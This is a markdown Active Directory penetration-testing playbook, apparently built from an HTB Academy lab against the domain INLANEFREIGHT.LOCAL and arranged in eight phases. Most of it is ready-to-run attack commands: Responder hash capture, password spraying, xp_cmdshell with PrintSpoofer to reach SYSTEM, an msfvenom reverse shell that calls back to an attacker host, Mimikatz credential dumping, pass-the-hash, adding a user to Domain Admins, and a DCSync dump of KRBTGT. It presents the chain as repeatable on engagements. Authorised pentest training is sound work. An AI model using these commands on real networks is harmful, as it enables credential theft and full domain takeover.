# AD Enumeration & Attacks — Internal Pentest Playbook

> **Source:** HTB Academy — AD Enumeration & Attacks Part II (Skills Assessment)
> **Domain:** INLANEFREIGHT.LOCAL
> **Date:** 2026-05-02
> **Status:** ✅ Validated — All 12 questions answered, domain compromised

---

## Attack Chain Overview

```
Responder → hashcat → DomainPasswordSpray → smbmap → web.config → MSSQL →
PrintSpoofer → SYSTEM → Mimikatz → PtH (evil-winRM) → BloodHound →
Inveigh → hashcat → GenericAll abuse → DCSync
```

---

## Phase 1: Initial Foothold — Hash Capture

### Responder (LLMNR/NBT-NS Poisoning)
```bash
sudo responder -I <interface> -wrfv
# Wait for broadcast/multicast name resolution requests
# Capture NTLMv2 hash → save to file
```

### Crack Hash
```bash
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt
```

**Hashcat Mode Reference:**
| Hash Type | Mode |
|-----------|------|
| NTLMv1 | 5500 |
| NTLMv2 | 5600 |
| NetNTLMv1 | 5500 |
| NetNTLMv2 | 5600 |
| AS-REP Roasting | 18200 |
| Kerberoasting (TGS) | 13100 |

---

## Phase 2: Credential Validation & Access

### Validate Creds (SMB)
```bash
crackmapexec smb <target> -u <user> -p <password>
crackmapexec smb <target> -u <user> -H <NTLM_HASH>
```

### RDP Access
```bash
xfreerdp3 /v:<target> /u:<user> /p:<password> /cert:ignore
```

### WinRM Access
```bash
evil-winrm -i <target> -u <user> -p <password>
evil-winrm -i <target> -u <user> -H <NTLM_HASH>
```

**⚠️ Critical Learning — Pass-the-Hash Protocol Matrix:**
| Protocol | PtH Works? | Notes |
|----------|-----------|-------|
| SMB (crackmapexec) | ⚠️ Sometimes fails | `STATUS_LOGON_FAILURE` possible |
| WinRM (evil-winRM) | ✅ More reliable | Same hash that SMB rejected |
| RDP (xfreerdp) | ❌ Often blocked | "Account restrictions" = NTLMv2-only policy |
| **Rule:** If PtH fails on one protocol, try others immediately |

---

## Phase 3: Credential Discovery — Password Spraying

### DomainPasswordSpray
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <password> -OutFile spray_results.txt
```

**Key checks before spraying:**
- Lockout policy: `Get-ADDefaultDomainPasswordPolicy` (or observe spray output)
- No lockout = safe to spray large user lists
- Common weak passwords: `Welcome1`, `Password123`, `Password1`, `<season><year>`

---

## Phase 4: Share Enumeration — smbmap vs crackmapexec

### smbmap (Reveals shares crackmapexec misses!)
```bash
# List shares
smbmap -u '<user>' -p '<password>' -d <DOMAIN> -H <IP>

# Recursive enumeration (replaces broken `-R`)
smbmap -u '<user>' -p '<password>' -d <DOMAIN> -H <IP> -r "Share Name" --depth 5

# Download file
smbmap -u '<user>' -p '<password>' -d <DOMAIN> -H <IP> --download "Share/Path/File"
```

**⚠️ Critical Learning:**
- crackmapexec against DC01 with hostname returned **empty**
- smbmap revealed `Department Shares` with full folder structure
- **Always cross-verify with smbmap when shares seem sparse**
- crackmapexec works better with **IPs** than hostnames

---

## Phase 5: SQL Server Privilege Escalation

### Connect to MSSQL
```bash
impacket-mssqlclient <DOMAIN>/<user>:<password>@<target>
impacket-mssqlclient <user>:'<password>'@<target>
```

### Enable xp_cmdshell
```sql
enable_xp_cmdshell
```

### Check Privileges (from SQL shell)
```sql
xp_cmdshell "whoami /all"
```

### PrintSpoofer — SeImpersonatePrivilege → SYSTEM
```sql
upload /path/to/PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe
xp_cmdshell "C:\Windows\Temp\PrintSpoofer64.exe -i -c whoami"
```

**⚠️ Critical Learning:**
- SQL service accounts (`NT SERVICE\MSSQL$SQLEXPRESS`) often have `SeImpersonatePrivilege`
- Check with `whoami /all` from `xp_cmdshell`
- PrintSpoofer reliably escalates: `PrintSpoofer64.exe -i -c <command>`

### Reverse Shell via msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe -o /tmp/rev.exe
```

Upload and execute:
```sql
upload /tmp/rev.exe C:\Windows\Temp\rev.exe
xp_cmdshell "C:\Windows\Temp\PrintSpoofer64.exe -i -c C:\Windows\Temp\rev.exe"
```

### Mimikatz from SYSTEM Shell
```cmd
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "sekurlsa::logonpasswords" "exit"
```

---

## Phase 6: BloodHound — AD Attack Path Mapping

### bloodhound-python (from attacker host)
```bash
# Password auth
bloodhound-python -d <DOMAIN> -u <user> -p '<password>' -c All -ns <DC_IP> --zip

# Pass-the-hash (LM:NT format required!)
bloodhound-python -d <DOMAIN> -u <user> --hashes 'aad3b435b51404eeaad3b435b51404ee:<NT_HASH>' -c All -ns <DC_IP> --zip
```

**⚠️ Critical Learning:** `--hashes` requires `LMHASH:NTHASH` with colon. Empty LM hash is always `aad3b435b51404eeaad3b435b51404ee`.

### SharpHound (from compromised host)
```powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain <DOMAIN> -ZipFileName output.zip
```

### BloodHound Queries to Run
1. Search for **Domain Admins** → Check **Inbound Object Control**
2. Look for: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword
3. Check **DCSync** rights (requires BloodHound CE or custom queries)

---

## Phase 7: Hash Capture — Inveigh in Constrained Shells

### Inveigh in evil-winRM (No Interactive Input)

**Option A: Auto-exit with `-RunTime`**
```powershell
Invoke-Inveigh -RunTime 15 -ConsoleOutput Y -FileOutput Y
```

**Option B: Background job (recommended)**
```powershell
Start-Job -Name InveighCapture -ScriptBlock {
    Import-Module C:\Path\To\Inveigh.ps1
    Invoke-Inveigh -RunTime 15 -ConsoleOutput N -FileOutput Y
} -Name InveighCapture
```

**⚠️ Critical Learning:** `-ConsoleOutput N` prevents the `Console.KeyAvailable` infinite loop error in evil-winRM.

### Trigger Target Authentication
```powershell
# Find services running as target user
Get-WmiObject Win32_Service | Where-Object { $_.StartName -like "*<USER>*" } | Select-Object Name, StartName, State

# Restart service to trigger auth
Restart-Service -Name "<ServiceName>"
```

### Read Captured Hashes
```powershell
Get-Content C:\Users\<User>\Documents\Inveigh-NTLMv2.txt
```

---

## Phase 8: Domain Compromise — GenericAll Abuse

### Add Self to Domain Admins
```cmd
net group "Domain Admins" <username> /add /domain
```

**⚠️ Critical Learning:** Group membership changes require **fresh authentication**. Existing sessions keep old Kerberos tickets.

- `type \\DC01\C$\...` from existing session = **Access Denied**
- Use **new** authentication for fresh ticket:
  - crackmapexec with creds
  - New evil-winRM session
  - New RDP session

### DCSync — Dump KRBTGT Hash
```bash
impacket-secretsdump <DOMAIN>/<user>:<password>@<DC_IP> -just-dc-user KRBTGT
```

---

## Quick Reference — Commands by Phase

| Phase | Goal | Primary Tool | Key Command |
|-------|------|--------------|-------------|
| 1 | Hash capture | Responder | `responder -I ens224 -wrfv` |
| 2 | Crack hash | hashcat | `hashcat -m 5600 hash.txt rockyou.txt` |
| 3 | Spray passwords | DomainPasswordSpray | `Invoke-DomainPasswordSpray -Password Welcome1` |
| 4 | Find shares | smbmap | `smbmap -u user -p pass -d DOM -H IP -r "Share" --depth 5` |
| 5 | SQL → SYSTEM | PrintSpoofer | `PrintSpoofer64.exe -i -c cmd` |
| 6 | AD mapping | BloodHound | `bloodhound-python -d DOM -u user -p pass -c All -ns DC_IP` |
| 7 | Capture hash | Inveigh | `Invoke-Inveigh -RunTime 15 -ConsoleOutput N -FileOutput Y` |
| 8 | Domain Admin | net | `net group "Domain Admins" user /add /domain` |
| 8 | DCSync | secretsdump | `impacket-secretsdump DOM/user:pass@DC -just-dc-user KRBTGT` |

---

## Credential Storage Template

| Account | Password / Hash | Source | Valid On | Privileges |
|---------|-----------------|--------|----------|------------|
| | | | | |

---

## Flag Tracking Template

| Host | Location | Flag | Status |
|------|----------|------|--------|
| | | | |

---

## Lessons Learned (Add per engagement)

1. **smbmap > crackmapexec** for share discovery — always cross-verify
2. **PtH protocol matters** — SMB fails, WinRM works, RDP blocked
3. **SQL service accounts = SYSTEM** via `SeImpersonatePrivilege` + PrintSpoofer
4. **Inveigh needs `-RunTime` or `Start-Job`** in constrained shells
5. **bloodhound-python** needs `LM:NT` format for `--hashes`
6. **Group membership changes need fresh auth** — old Kerberos tickets persist
7. **Responder → hashcat → spray → smbmap → SQL → PrintSpoofer → PtH → BloodHound → Inveigh → DCSync** is a repeatable full-chain

---

*Playbook created: 2026-05-02*
*Validated on: HTB Academy — AD Enumeration & Attacks Part II*
